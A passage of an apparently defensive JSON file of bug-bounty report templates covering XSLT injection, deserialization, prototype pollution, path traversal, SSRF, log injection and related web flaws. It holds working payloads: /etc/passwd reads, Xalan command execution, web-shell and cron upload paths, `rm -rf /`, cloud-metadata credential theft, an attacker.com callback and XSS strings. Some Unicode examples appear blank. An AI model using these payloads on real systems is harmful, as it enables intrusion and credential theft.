              "   b. Send this XML payload to the vulnerable endpoint.",
              "   c. **[What happened]**: The application's response includes the content of `/etc/passwd` or another specified file.",
              "   d. **[What should happen]**: The XSLT processor should restrict access to local files and external resources, or inputs should be sanitized.",
              "3. **[Scenario B: Remote Code Execution (if extensions enabled)]**",
              "   a. If the XSLT processor has scripting extensions enabled (e.g., `saxon:script`, `java:`, `msxsl:script`), inject code to execute arbitrary commands.",
              "   b. Example (Java extensions with Apache Xalan):",
              "     ```xml\n     <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)\" xmlns:rt=\"[http://xml.apache.org/xalan/java/java.lang.Runtime](http://xml.apache.org/xalan/java/java.lang.Runtime)\">\n       <xsl:template match=\"/\">\n         <xsl:value-of select=\"rt:exec('calc')\"/>\n       </xsl:template>\n     </xsl:stylesheet>\n     ```",
              "   c. **[What happened]**: The injected command (e.g., `calc.exe` on Windows) is executed on the server.",
              "   d. **[What should happen]**: Scripting extensions should be disabled or run in a highly sandboxed environment.",
              "4. **[Scenario C: SSRF via XSLT]**",
              "   a. Modify the `document()` function (or similar) to point to internal network resources. Example: `document('http://127.0.0.1/admin')`."
            ],
            "proof_of_concept": {
              "request_example": "POST /transform_data HTTP/1.1\nHost: api.example.com\nContent-Type: application/xml\n\n<root xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xsl:version=\"1.0\">\n  <xsl:output method=\"text\"/>\n  <xsl:template match=\"/\">\n    <xsl:value-of select=\"document('file:///etc/passwd')\"/>\n  </xsl:template>\n</root>",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...",
              "notes": "Provide the malicious XML/XSLT payload, the HTTP request and response showing file contents or command output. Screenshots of the application's response or any side effects (e.g., calculator pop-up)."
            },
            "impact": "Remote Code Execution (RCE) on the server, leading to complete system compromise. Information disclosure (reading arbitrary files). Server-Side Request Forgery (SSRF) to internal or external systems. Denial of Service (DoS) by exploiting resource consumption.",
            "remediation_suggestion": "Disable XSLT scripting extensions and restrict access to external resources (`document()` function, `file:///` access) in the XSLT processor. Implement strict input validation for all XML and XSLT inputs. Use a secure XSLT processor that supports sandboxing or has these dangerous features disabled by default."
          },
          {
            "vulnerability_name": "Deserialization",
            "summary": "Deserialization vulnerabilities occur when an application deserializes untrusted data without proper validation, allowing an attacker to manipulate the serialized object to execute arbitrary code, bypass authentication, or cause denial of service.",
            "severity": "Critical",
            "target": "[Specify affected asset, e.g., api.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint that processes serialized data, e.g., https://api.example.com/user/profile_update]",
            "steps_to_reproduce": [
              "1. Identify an endpoint or functionality that accepts serialized objects from user input (e.g., cookies, hidden form fields, API requests, file uploads). Common formats include Java serialized objects, PHP serialized strings, Python pickles, .NET ViewState.",
              "2. **[Scenario A: Arbitrary Code Execution]**",
              "   a. Use a tool like Ysoserial (for Java), PHPGGC (for PHP), or custom scripts to generate a malicious serialized payload (gadget chain) that executes a system command (e.g., `calc.exe`, `id`, `rm -rf /`).",
              "   b. Replace the legitimate serialized data in the request (e.g., cookie value, POST body) with the malicious payload.",
              "   c. **[What happened]**: The arbitrary command is executed on the server-side, and its output (if a channel exists) or side effects (e.g., file deletion, new process) are observed.",
              "   d. **[What should happen]**: The application should not deserialize untrusted data without strong integrity checks or sandboxing.",
              "3. **[Scenario B: Authentication Bypass/Privilege Escalation]**",
              "   a. Analyze the application's object structure. Identify sensitive objects (e.g., `User`, `Session`, `Admin`) and their properties.",
              "   b. Craft a serialized object that, when deserialized, grants elevated privileges (e.g., setting an `isAdmin` flag to true, or overriding a user ID).",
              "   c. **[What happened]**: The application grants unauthorized access or elevated privileges.",
              "   d. **[What should happen]**: Sensitive flags or IDs should not be modifiable via deserialization, and authentication context should be strictly controlled.",
              "4. **[Scenario C: Denial of Service]**",
              "   a. Craft a serialized object that causes infinite loops, excessive memory consumption, or other resource exhaustion issues during deserialization.",
              "   b. **[What happened]**: The server becomes unresponsive or crashes due to the malicious deserialization.",
              "   c. **[What should happen]**: Resource limits and input validation should be applied to deserialization processes."
            ],
            "proof_of_concept": {
              "request_example": "POST /user/profile_update HTTP/1.1\nHost: api.example.com\nContent-Type: application/x-java-serialized-object\n\n[Base64_Encoded_Malicious_Java_Serialized_Object]",
              "notes": "Provide the generated serialized payload (or its base64 encoded form), the HTTP request/response. Crucially, document the observed effect on the server (e.g., screenshot of command execution, file system changes, server unresponsiveness). If no direct output channel, show out-of-band interaction (e.g., DNS query to attacker domain)."
            },
            "impact": "Remote Code Execution (RCE) on the server, leading to complete system compromise. Authentication bypass, privilege escalation, and sensitive data exposure. Denial of Service (DoS) leading to application downtime. This is one of the most severe vulnerabilities due to its potential for full system control.",
            "remediation_suggestion": "Avoid deserializing untrusted data. If deserialization is unavoidable, implement strict integrity checks (e.g., HMAC signatures) to ensure the serialized data has not been tampered with. Use a safe deserialization library or implement strict whitelisting of allowed classes/types that can be deserialized. Upgrade to secure versions of libraries and frameworks. Isolate deserialization processes in low-privileged environments."
          },
          {
            "vulnerability_name": "Prototype Pollution to XSS",
            "summary": "Prototype Pollution is a JavaScript vulnerability that allows an attacker to add or modify properties of the `Object.prototype`, which then affects all JavaScript objects. When this leads to the injection of a malicious value into a sink that reflects on the page, it can result in Cross-Site Scripting (XSS).",
            "severity": "High",
            "target": "[Specify affected asset, e.g., app.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://app.example.com/?config=]",
            "steps_to_reproduce": [
              "1. Identify an endpoint that accepts data which is then parsed or processed in JavaScript in a way that allows property assignment on objects (e.g., URL parameters, JSON parsing, deep merge operations, clone functions).",
              "2. **[Scenario A: Basic Prototype Pollution]**",
              "   a. Try to inject a basic prototype pollution payload into a URL parameter or JSON body. Common payloads: `?__proto__[key]=value` or `?constructor[prototype][key]=value`.",
              "   b. **[What happened]**: Observe that `Object.prototype.key` now holds `value` by checking `Object.prototype.key` in the browser console. This confirms pollution.",
              "   c. **[What should happen]**: The application should prevent manipulation of `Object.prototype`.",
              "3. **[Scenario B: Pollution to XSS (via Template Engine or DOM Sink)]**",
              "   a. Identify a JavaScript library or framework used on the page (e.g., a templating engine, a `jQuery.html()` call) that accepts data from user input and renders it into the DOM.",
              "   b. Research how that library/framework can be leveraged via prototype pollution to trigger XSS. This often involves polluting properties like `template`, `innerHTML`, `src`, `href`, or `onload`.",
              "   c. Inject a malicious payload that combines prototype pollution with an XSS payload (e.g., `?__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>`).",
              "   d. **[What happened]**: The `alert` box pops up, indicating successful XSS through prototype pollution.",
              "   e. **[What should happen]**: The application should not allow arbitrary property modification of `Object.prototype`, and all DOM sinks should sanitize input.",
              "4. **[Scenario C: Pollution to XSS (via Gadget Chain)]**",
              "   a. If no direct sink, look for a 'gadget chain' within the application's JavaScript code or third-party libraries where polluting one property leads to another being affected, eventually reaching an XSS sink."
            ],
            "proof_of_concept": {
              "request_example": "GET /?__proto__[innerHTML]=<img%20src%3Dx%20onerror%3Dalert(document.domain)> HTTP/1.1\nHost: app.example.com",
              "notes": "Provide the exact URL or POST payload. Include screenshots of the browser's developer console showing the polluted prototype, and the XSS alert box. Detail the specific JavaScript library or framework involved if known."
            },
            "impact": "Cross-Site Scripting (XSS), leading to session hijacking, sensitive data theft, defacement, and arbitrary code execution in the victim's browser. The severity can be high as it leverages a core JavaScript mechanism.",
            "remediation_suggestion": "Avoid using recursive merge or clone functions that do not properly validate input keys, especially those that can override `__proto__` or `constructor.prototype`. Freeze `Object.prototype` to prevent modifications. Use secure coding practices for all client-side rendering, ensuring proper sanitization of all data before it's written to the DOM."
          },
          {
            "vulnerability_name": "Path Confusion",
            "summary": "Path Confusion (or Path Traversal) occurs when an application constructs file paths using user-supplied input without proper validation or sanitization, allowing an attacker to access or manipulate files outside of the intended directory.",
            "severity": "High",
            "target": "[Specify affected asset, e.g., files.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://files.example.com/download?filename=]",
            "steps_to_reproduce": [
              "1. Identify an input field or URL parameter that is used to construct file paths (e.g., `filename` for file download/upload, `path` for image loading, `template` for loading templates).",
              "2. **[Scenario A: Arbitrary File Read]**",
              "   a. Inject path traversal sequences into the vulnerable parameter. Common sequences: `../`, `..\\`, `..%2f`, `..%5c`, `../../../../etc/passwd`.",
              "   b. Example payload: `filename=../../../../etc/passwd` or `filename=../../../../Windows/win.ini`.",
              "   c. **[What happened]**: The application returns the content of the specified arbitrary file.",
              "   d. **[What should happen]**: The application should prevent directory traversal and only serve files from the intended directory.",
              "3. **[Scenario B: Arbitrary File Write/Upload (if applicable)]**",
              "   a. If the endpoint allows file uploads, inject a path traversal sequence into the filename or path parameter.",
              "   b. Example payload: `filename=../../../../../var/www/html/evil.php` for a web shell, or `filename=../../../../../etc/cron.d/evil` for cron job injection.",
              "   c. **[What happened]**: The malicious file is uploaded to an arbitrary location on the server, potentially leading to remote code execution.",
              "   d. **[What should happen]**: File upload paths should be strictly controlled and validated.",
              "4. **[Scenario C: Bypassing Filters]**",
              "   a. If basic `../` sequences are filtered, try encoded sequences (`%2e%2e%2f`), double encoding (`%252e%252e%252f`), or null bytes (`%00`) to truncate paths. Example: `filename=..%2f..%2f..%2f..%2fetc/passwd%00.jpg`."
            ],
            "proof_of_concept": {
              "request_example": "GET /download?filename=../../../../etc/passwd HTTP/1.1\nHost: files.example.com",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...",
              "notes": "Provide the exact URL with the malicious filename, and the HTTP request/response showing the content of the accessed file. Screenshots of the downloaded file or web page displaying the content."
            },
            "impact": "Arbitrary file reading, leading to sensitive data disclosure (credentials, configuration files, source code). Arbitrary file writing, potentially leading to remote code execution (RCE) by uploading web shells or modifying system files. Denial of Service (DoS) by overwriting critical system files or deleting essential application components.",
            "remediation_suggestion": "Implement strong input validation to prevent path traversal sequences (`../`, `..\\`) from being included in file paths. Sanitize user input by removing or normalizing such sequences. Use an allowlist approach for valid file names and directories. Limit the application's file system permissions to the absolute minimum required. When serving files, use absolute file paths and canonicalize paths to prevent traversal."
          },
          {
            "vulnerability_name": "Query Parameter Pollution / Ambiguity",
            "summary": "Query Parameter Pollution (QPP) or Ambiguity occurs when an application processes multiple occurrences of the same query parameter in a way that can be manipulated by an attacker to bypass security filters, access unauthorized data, or achieve unexpected application behavior.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., api.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://api.example.com/search?q=]",
            "steps_to_reproduce": [
              "1. Identify an endpoint that accepts query parameters (e.g., search, filter, ID parameters).",
              "2. **[Scenario A: Filter Bypass]**",
              "   a. The application uses a filter like `q=safe_query` to search, but has a backend filter for `admin` only for `q=admin_query`.",
              "   b. Try to inject multiple `q` parameters: `?q=safe_query&q=admin_query`.",
              "   c. **[What happened]**: The application processes the second (or last, or first, depending on server/framework logic) `q` parameter, bypassing the intended filter and revealing `admin_query` results to a non-admin user.",
              "   d. **[What should happen]**: The application should consistently handle duplicate parameters, ideally by using only the first occurrence or explicitly concatenating them, or by rejecting ambiguous input.",
              "3. **[Scenario B: Logic Bypass/IDOR]**",
              "   a. Identify a parameter that references an ID, e.g., `?id=user123`.",
              "   b. Try to combine a valid ID with an unauthorized ID: `?id=my_id&id=another_users_id`.",
              "   c. **[What happened]**: The application processes the unauthorized ID due to QPP logic, leading to an IDOR (accessing another user's data).",
              "4. **[Scenario C: Web Cache Poisoning (if proxy involved)]**",
              "   a. If an intermediate proxy or CDN is involved, and it handles duplicate parameters differently than the backend application.",
              "   b. Example: Proxy uses `param1`, backend uses `param2`. Inject `?param=malicious&param=legitimate`.",
              "   c. **[What happened]**: The proxy caches based on the first parameter, but the backend responds based on the second, leading to a cached malicious response for other users.",
              "   d. **[What should happen]**: Consistent parsing across all layers of the application stack."
            ],
            "proof_of_concept": {
              "request_example": "GET /search?q=normal_user_query&q=admin_only_query HTTP/1.1\nHost: api.example.com",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"results\": [\n    \"Sensitive Admin Document 1\",\n    \"Sensitive Admin Document 2\"\n  ]\n}",
              "notes": "Provide the exact URL with the polluted parameters, and the HTTP request/response showing the unexpected behavior or data access. Screenshots of the results."
            },
            "impact": "Authorization bypass (accessing restricted data or functionality). Filter bypass. Web cache poisoning, leading to widespread defacement or XSS. Can also lead to business logic flaws or unexpected application behavior, depending on how duplicate parameters are processed by the backend framework or server.",
            "remediation_suggestion": "Ensure consistent handling of duplicate query parameters across all layers of the application stack (web server, application server, framework, CDN/proxy). Ideally, process only the first occurrence of a parameter, or explicitly concatenate all values if multi-value handling is intended. Implement strict input validation for all parameters and reject ambiguous requests."
          },
          {
            "vulnerability_name": "HTTP Parameter Override",
            "summary": "HTTP Parameter Override occurs when an application allows an attacker to override internal parameters or configuration values by supplying them via HTTP requests (e.g., query parameters, POST body, custom headers). This can bypass security checks, manipulate application logic, or disclose sensitive information.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., api.example.com]",
            "url_location": "[Any endpoint that processes parameters, e.g., https://api.example.com/process_order]",
            "steps_to_reproduce": [
              "1. Identify an application that might be susceptible to internal parameter overrides. This often involves frameworks that automatically map request parameters to internal variables or objects.",
              "2. **[Scenario A: Overriding Security Flags]**",
              "   a. During a sensitive operation (e.g., placing an order, profile update), look for parameters that might correspond to internal flags like `isAdmin`, `isApproved`, `debugMode`, `bypassAuth`.",
              "   b. Inject a parameter like `?isAdmin=true` or `&debugMode=true` into the request.",
              "   c. **[What happened]**: The application's behavior changes, granting elevated privileges (e.g., an order is auto-approved, debug information is revealed).",
              "   d. **[What should happen]**: Internal flags should not be directly controllable via client-side parameters.",
              "3. **[Scenario B: Overriding Internal Configuration Values]**",
              "   a. During a request that involves database operations or file paths, try to override internal configuration parameters like `database_name`, `log_file_path`, `template_directory`.",
              "   b. Example: `?database_name=attacker_db` or `&log_file_path=/dev/null`.",
              "   c. **[What happened]**: The application attempts to use the overridden value, potentially leading to errors, information disclosure, or DoS.",
              "   d. **[What should happen]**: Configuration values should be loaded securely from server-side configuration, not request parameters.",
              "4. **[Scenario C: Overriding User ID/Role (Mass Assignment)]**",
              "   a. In an endpoint that updates a user's profile or creates a new user, try to inject a `user_id` or `role` parameter that doesn't belong to the current user or is a privileged role.",
              "   b. Example: `username=attacker&role=admin` during registration, or `id=victim_id&isAdmin=true` during profile update.",
              "   c. **[What happened]**: The application updates the role or attributes of another user, or creates a privileged account.",
              "   d. **[What should happen]**: Only authorized parameters should be mass-assigned, and sensitive attributes should be handled separately with strict authorization."
            ],
            "proof_of_concept": {
              "request_example": "POST /api/create_account HTTP/1.1\nHost: api.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=new_admin&password=securepass&role=admin",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"success\", \"message\": \"Account new_admin created with role: admin\"}",
              "notes": "Provide the exact request payload showing the overridden parameter. Include screenshots of the application's response demonstrating the successful override and its effect (e.g., admin dashboard access, debug output, altered data)."
            },
            "impact": "Authentication bypass, privilege escalation, and unauthorized access to data or functionality. Can lead to sensitive information disclosure, denial of service, or complete application compromise by manipulating internal logic or configurations.",
            "remediation_suggestion": "Implement strict whitelisting for all parameters that are accepted and processed by the application. Never trust client-supplied parameters for sensitive internal logic or configuration. Use anti-mass assignment techniques in frameworks to prevent unauthorized parameter binding to internal objects. Conduct thorough reviews of how request parameters are mapped to internal variables."
          },
          {
            "vulnerability_name": "Type Confusion Bugs",
            "summary": "Type Confusion bugs occur when an application attempts to access a resource or perform an operation using an incorrect data type, leading to unexpected behavior, crashes, or security vulnerabilities like arbitrary code execution or information disclosure.",
            "severity": "High",
            "target": "[Specify affected asset, e.g., backend.example.com (API or internal service)]",
            "url_location": "[Relevant API endpoint or input processing function, e.g., https://backend.example.com/process_data]",
            "steps_to_reproduce": [
              "1. Identify an endpoint or function where the application expects a specific data type for an input (e.g., integer for ID, string for name, boolean for flag).",
              "2. **[Scenario A: Integer/String Confusion]**",
              "   a. If an application expects an integer ID (e.g., `id=123`), try providing a string or an object in its place (e.g., `id={\"value\": 123}`, `id=abc`, `id=[]`).",
              "   b. **[What happened]**: The application attempts to interpret the string/object as an integer, leading to a crash, an unexpected value (e.g., `0`), or a different code path being executed.",
              "   c. **[What should happen]**: The application should strictly validate input types and handle type mismatches gracefully.",
              "3. **[Scenario B: Object/Primitive Confusion]**",
              "   a. If a parameter is expected to be a simple string or number, try passing a complex JSON object or array in its place (e.g., `param=value` vs. `param={'field': 'value'}`).",
              "   b. **[What happened]**: The application's internal logic is confused, leading to errors, memory corruption, or unintended data access.",
              "   c. **[What should happen]**: The application should validate the structure and type of complex inputs.",
              "4. **[Scenario C: Boolean/Integer Confusion]**",
              "   a. If an application expects a boolean flag (e.g., `isAdmin=true`), try passing an integer or string that might be type-coerced into a different boolean value than intended (e.g., `isAdmin=1`, `isAdmin=0`, `isAdmin=something`).",
              "   b. **[What happened]**: The application misinterprets the boolean flag, leading to privilege escalation or bypass of a security check.",
              "   c. **[What should happen]**: Boolean flags should be explicitly validated to be `true` or `false`."
            ],
            "proof_of_concept": {
              "request_example": "POST /process_data HTTP/1.1\nHost: backend.example.com\nContent-Type: application/json\n\n{\"id\": \"123ABC\"}",
              "response_example": "HTTP/1.1 500 Internal Server Error\nContent-Type: text/plain\n\nInternal server error: TypeError: Cannot read property 'length' of undefined at ...",
              "notes": "Provide the exact input that causes the type confusion, the HTTP request and response, and any error messages or stack traces returned. Screenshots of application crashes or unexpected behavior."
            },
            "impact": "Denial of Service (DoS) due to application crashes. Arbitrary code execution (if memory corruption occurs). Information disclosure (e.g., through error messages revealing internal structure). Privilege escalation or authentication bypass if type confusion leads to misinterpretation of security-critical flags.",
            "remediation_suggestion": "Implement strict and comprehensive input validation for all data types. Explicitly cast or parse inputs to the expected type and handle type errors gracefully. Use strongly-typed languages and frameworks where possible. Perform fuzzing with unexpected data types to uncover such vulnerabilities."
          },
          {
            "vulnerability_name": "Unicode Normalization Vulnerability",
            "summary": "Unicode Normalization vulnerabilities occur when an application uses Unicode characters without proper normalization, leading to security bypasses (e.g., authentication, path traversal) due to differing interpretations of characters at different stages of processing (e.g., `.` vs. `` (fullwidth dot)).",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., auth.example.com]",
            "url_location": "[Any endpoint processing user-supplied strings, e.g., https://auth.example.com/login, https://example.com/files/download]",
            "steps_to_reproduce": [
              "1. Identify an input field where strings are processed (e.g., username, filename, URL paths, email addresses).",
              "2. **[Scenario A: Authentication Bypass (Username/Email)]**",
              "   a. Register a user (e.g., `admin`).",
              "   b. Try to log in with a Unicode variant of `admin` that normalizes to `admin` but is different in canonical form. Example: Using `` (fullwidth characters), or a combination of characters that normalize differently in NFD vs NFC (e.g., `o` vs `o` + combining diaeresis).",
              "   c. **[What happened]**: The application's database might store `admin` in one form (e.g., NFC) while the authentication logic normalizes input to another (e.g., NFD) or doesn't normalize at all, leading to bypass.",
              "   d. **[What should happen]**: All string comparisons and storage should use a consistent Unicode normalization form (e.g., NFC).",
              "3. **[Scenario B: Path Traversal Bypass]**",
              "   a. If an application filters `../` for path traversal, try to encode dots or slashes using Unicode variants that normalize back to the original. Example: `` (fullwidth chars for `../`).",
              "   b. **[What happened]**: The filter is bypassed, and the application processes the path traversal as intended.",
              "   c. **[What should happen]**: Filters should apply normalization before processing and then filter on the normalized form.",
              "4. **[Scenario C: URL Parsing/Redirection Bypass]**",
              "   a. If an application redirects to a user-supplied URL, try to use a Unicode variant in the domain or path to bypass a URL allowlist.",
              "   b. Example: `http://evildomaincom` (fullwidth dot).",
              "   c. **[What happened]**: The application's allowlist (which expects ASCII dots) is bypassed, and the redirection occurs to the malicious domain.",
              "   d. **[What should happen]**: URL parsing and validation should account for Unicode equivalence."
            ],
            "proof_of_concept": {
              "input_example": "Login username: `` (fullwidth admin)",
              "notes": "Provide the exact Unicode payload used. Screenshots showing successful login with the non-standard characters, or file access after bypassing filters. Detail the specific normalization form issue if possible (NFC vs NFD)."
            },
            "impact": "Authentication bypass, leading to account takeover. Path traversal bypass, enabling arbitrary file access or RCE. URL redirection bypass for phishing attacks. This vulnerability can lead to critical security flaws if not handled correctly.",
            "remediation_suggestion": "Implement consistent Unicode normalization for all user-supplied input strings before storage, comparison, or processing. Typically, using a single normalization form (e.g., NFC) for all operations is recommended. Ensure security filters (e.g., path traversal filters, URL allowlists) are applied *after* normalization."
          },
          {
            "vulnerability_name": "Unicode Bypass Bugs",
            "summary": "Unicode Bypass bugs are a broader category where the application's security controls (filters, validators, parsers) fail to correctly handle various Unicode encodings or characters, leading to bypasses of intended restrictions, often enabling XSS, SQLi, or other injection attacks.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., web.example.com]",
            "url_location": "[Any endpoint processing user-supplied strings, e.g., https://web.example.com/search?q=]",
            "steps_to_reproduce": [
              "1. Identify an input field that is subject to security filtering (e.g., XSS filter, SQLi filter, filename validation).",
              "2. **[Scenario A: Non-Canonical Encoding Bypass (UTF-7/UTF-8 variations)]**",
              "   a. If an application blocks `<script>` tags, try encoding the tag using non-standard UTF-7 or other less common encodings that a browser might still interpret. Example (UTF-7 for `<script>`): `+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-`.",
              "   b. **[What happened]**: The filter (expecting UTF-8) fails to detect the malicious string, and the browser interprets it, leading to XSS.",
              "   c. **[What should happen]**: Filters should canonicalize input to a single, consistent encoding before validation.",
              "3. **[Scenario B: Overlong UTF-8 Encoding Bypass]**",
              "   a. Some older or poorly implemented filters might be bypassed by using overlong UTF-8 encodings for ASCII characters. Example: `%c0%ae%c0%ae%c0%af` for `../` (though modern filters usually catch this).",
              "   b. **[What happened]**: The path traversal filter is bypassed, and arbitrary files are accessed.",
              "   c. **[What should happen]**: UTF-8 validation should reject overlong encodings.",
              "4. **[Scenario C: Unicode Homoglyph Attacks]**",
              "   a. If an allowlist or blocklist relies on visual similarity or specific character matching, try using visually similar Unicode characters (homoglyphs) to bypass checks. Example: Using `paypal.com` but with a Cyrillic 'a' (`aypal.com`).",
              "   b. **[What happened]**: The application accepts the homoglyph-containing input, potentially leading to phishing or filter bypass.",
              "   c. **[What should happen]**: Domain validation or URL parsing should account for homoglyphs or use Punycode for normalization."
            ],
            "proof_of_concept": {
              "input_example": "Comment field (for XSS bypass): `+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-`",
              "notes": "Provide the exact Unicode payload, the HTTP request and response. Screenshots showing the successful bypass (e.g., XSS alert box, file content from path traversal). Detail the specific encoding or character that enabled the bypass."
            },
            "impact": "Bypass of security filters for XSS, SQL Injection, Path Traversal, and other injection vulnerabilities. This can lead to unauthorized access, sensitive data disclosure, and remote code execution, depending on the underlying injection. Can also enable sophisticated phishing attacks.",
            "remediation_suggestion": "All input should be canonicalized to a single, consistent encoding (e.g., UTF-8, rejecting overlong forms) before validation or filtering. Implement strict input validation using allowlists rather than blocklists for all user-supplied data. Utilize robust Unicode-aware libraries for string manipulation, encoding, and decoding."
          },
          {
            "vulnerability_name": "Server-Side Request Forgery (SSRF)",
            "summary": "Server-Side Request Forgery (SSRF) allows an attacker to cause the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. This can be used to bypass firewalls, scan internal networks, access sensitive internal resources, or attack other internal systems.",
            "severity": "High",
            "target": "[Specify affected asset, e.g., image-processor.example.com]",
            "url_location": "[Full URL of the vulnerable endpoint, e.g., https://image-processor.example.com/fetch?url=]",
            "steps_to_reproduce": [
              "1. Identify an endpoint where the application fetches resources from a user-supplied URL (e.g., image loading, file import, webhook configuration, PDF generation from URL, RSS feed reader, avatar upload from URL).",
              "2. **[Scenario A: Basic SSRF (External to Internal)]**",
              "   a. In the `url` parameter, try to make the server request an internal resource. Example: `url=http://127.0.0.1/admin` or `url=file:///etc/passwd`.",
              "   b. **[What happened]**: The application's response reveals the content of the internal admin page or `/etc/passwd`.",
              "   c. **[What should happen]**: The application should restrict requests to external, whitelisted domains only.",
              "3. **[Scenario B: SSRF to Cloud Metadata]**",
              "   a. If the application is hosted on a cloud provider (AWS, Azure, GCP), try to access the cloud metadata endpoint. Example: `url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
              "   b. **[What happened]**: The application's response contains sensitive cloud metadata, including temporary AWS credentials.",
              "   c. **[What should happen]**: All internal IP addresses should be blocked or blacklisted.",
              "4. **[Scenario C: Blind SSRF (Out-of-Band Interaction)]**",
              "   a. If the response doesn't directly show the fetched content, try to make the server interact with an attacker-controlled endpoint (e.g., Burp Collaborator, `ngrok`). Example: `url=http://attacker.com/ssrf_test`.",
              "   b. **[What happened]**: Observe a request from the target server's IP address on your attacker-controlled server, confirming blind SSRF.",
              "   c. **[What should happen]**: No requests should be made to arbitrary external URLs.",
              "5. **[Scenario D: Scheme/Protocol Manipulation]**",
              "   a. If HTTP/HTTPS schemes are filtered, try other schemes like `file://`, `gopher://`, `dict://`, `ftp://` to bypass filters or access other services.",
              "   b. Example: `url=gopher://localhost:80/HTTP/1.1%0D%0AGET%20/%0D%0A%0D%0A` for HTTP requests through gopher."
            ],
            "proof_of_concept": {
              "request_example": "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\nHost: image-processor.example.com",
              "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2025-05-27T08:00:00Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"abc...\",\n  \"Token\": \"def...\",\n  \"Expiration\": \"2025-05-27T10:00:00Z\"\n}",
              "notes": "Provide the exact URL with the malicious `url` parameter. HTTP request and response showing the fetched internal content. For blind SSRF, provide attacker server logs (e.g., HTTP access logs, DNS logs) confirming the interaction from the target server."
            },
            "impact": "Access to internal systems and resources (e.g., internal APIs, databases, microservices). Scanning internal networks (port scanning, discovering hidden hosts). Access to cloud provider metadata, leading to temporary credential compromise. Attacks on other internal services (e.g., Redis, Jenkins). Can lead to remote code execution (RCE) in conjunction with other vulnerabilities.",
            "remediation_suggestion": "Implement strict whitelisting for all URLs and IP addresses that the application is allowed to fetch. Never rely on blacklisting. Disable unused URL schemes (e.g., `file://`, `gopher://`, `dict://`). Filter out private and reserved IP ranges (e.g., 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254). Use a dedicated, isolated service for fetching external resources if required."
          },
          {
            "vulnerability_name": "Log Injection",
            "summary": "Log Injection allows an attacker to inject arbitrary log entries into an application's log files by including newline characters (CRLF) in user-supplied input. This can obscure legitimate log entries, mask malicious activity, or aid in other attacks.",
            "severity": "Low",
            "target": "[Specify affected asset, e.g., backend.example.com (logging service)]",
            "url_location": "[Any endpoint where user input is logged, e.g., https://example.com/login, https://example.com/contact_us]",
            "steps_to_reproduce": [
              "1. Identify an input field or parameter whose value is logged by the application (e.g., username, IP address from `X-Forwarded-For` header, message content in contact forms, error messages).",
              "2. Inject CRLF characters followed by a custom log entry. Example: `username=admin%0d%0aERROR: Attacker_IP_1.2.3.4_accessed_admin_panel_successfully`.",
              "3. **[What happened]**: When inspecting the server's log files, the injected line appears as a separate, seemingly legitimate log entry, making it difficult to distinguish real activity from malicious activity.",
              "4. **[What should happen]**: All user input being logged should be sanitized to remove or encode newline characters.",
              "5. **[Scenario B: Manipulating Log Severity/Format]**",
              "   a. If the logging system parses specific keywords or formats, try to inject those to change the perceived severity or structure of the log entry. Example: `message=Normal msg%0d%0a[CRITICAL] SQL Injection Attempt Detected!`.",
              "   b. **[What happened]**: The log entry appears as a critical event, potentially triggering false alarms or obscuring real critical events.",
              "   c. **[What should happen]**: Logging frameworks should robustly handle input and not allow formatting directives to be injected."
            ],
            "proof_of_concept": {
              "input_example": "Username field: `testuser%0d%0a192.168.1.1 - [27/May/2025:12:00:00 +0530] \"GET /admin HTTP/1.1\" 200 1234`",
              "log_file_example": "2025-05-27 11:59:59 INFO User: testuser\n2025-05-27 11:59:59 INFO 192.168.1.1 - [27/May/2025:12:00:00 +0530] \"GET /admin HTTP/1.1\" 200 1234\n2025-05-27 12:00:01 INFO User: legitimate_user",
              "notes": "Provide the exact payload used and the corresponding entry in the log file (screenshot of log file or copy-paste). Detail how it obscures or misrepresents legitimate logs."
            },
            "impact": "Hindrance of incident response and forensic analysis by obfuscating attacker activity. Can be used for denial of service on log management systems (filling up logs with junk). Can be part of a larger attack chain to make specific attacks appear less suspicious or to cover tracks.",
            "remediation_suggestion": "Sanitize all user-supplied input before it is written to log files by stripping or encoding newline characters (`%0d`, `%0a`). Use logging frameworks that are designed to prevent log injection and handle input as literal strings. Avoid directly concatenating raw user input into log messages."
          },
          {
            "vulnerability_name": "GraphQL Injection",
            "summary": "GraphQL Injection occurs when an attacker can inject malicious GraphQL query fragments or values into an application's GraphQL endpoint, bypassing input validation and potentially manipulating query logic, accessing unauthorized data, or causing denial of service.",
            "severity": "Medium",
            "target": "[Specify affected asset, e.g., api.example.com/graphql]",
            "url_location": "[Full URL of the GraphQL endpoint, e.g., https://api.example.com/graphql]",
            "steps_to_reproduce": [
              "1. Identify an application that exposes a GraphQL endpoint (typically `/graphql` or `/api`).",
              "2. **[Scenario A: Unauthorized Field Access/Data Exfiltration]**",
